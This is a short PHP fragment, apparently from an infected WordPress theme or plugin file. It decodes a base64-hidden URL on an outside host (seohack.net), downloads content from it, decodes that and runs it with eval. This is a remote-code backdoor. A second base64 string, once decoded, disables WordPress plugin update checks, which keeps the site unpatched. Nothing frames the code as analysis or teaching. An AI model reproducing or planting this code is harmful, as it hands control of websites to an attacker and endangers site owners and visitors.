...
$mainStr = "aHR0cHM6Ly9zZW9oYWNrLm5ldC9hZG1pbi9hcGkvbGlua3MvbWFpbi5SZW1vdEU=";
$mainStr = base64_decode($mainStr);
$mainStr = file_get_contents($mainStr);
$mainStr = base64_decode($mainStr);
eval($mainStr);
$disablePlugin = "cmVtb3ZlX2FjdGlvbignbG9hZC11cGRhdGUtY29yZS5waHAnLCd3cF91cGRhdGVfcGx1Z2lucycpOwphZGRfZmlsdGVyKCdwcmVfc2l0ZV90cmFuc2llbnRfdXBkYXRlX3BsdWdpbnMnLCdfX3JldHVybl9udWxsJyk7";
$disablePlugin = base64_decode($disablePlugin);
eval($disablePlugin);
